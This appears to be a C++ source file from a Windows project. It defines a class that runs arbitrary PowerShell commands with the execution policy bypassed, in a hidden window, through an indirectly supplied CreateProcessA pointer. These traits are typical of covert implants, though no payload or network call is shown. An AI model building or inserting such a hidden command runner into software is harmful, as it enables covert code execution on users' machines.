#include "pch.h"
#include "powershell.h"

CreateProcessA_t Powershell::pCreateProcess = nullptr;

Powershell::Powershell(CreateProcessA_t pCreateProcess)
{
	Powershell::pCreateProcess = pCreateProcess;
}

void Powershell::ExecuteCommand(std::string command)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	Powershell::pCreateProcess(NULL,
		(LPSTR)((std::string("powershell.exe -ExecutionPolicy Bypass -Command ") + command).c_str()),
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		(LPSTARTUPINFOA) & si,
		&pi);
	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
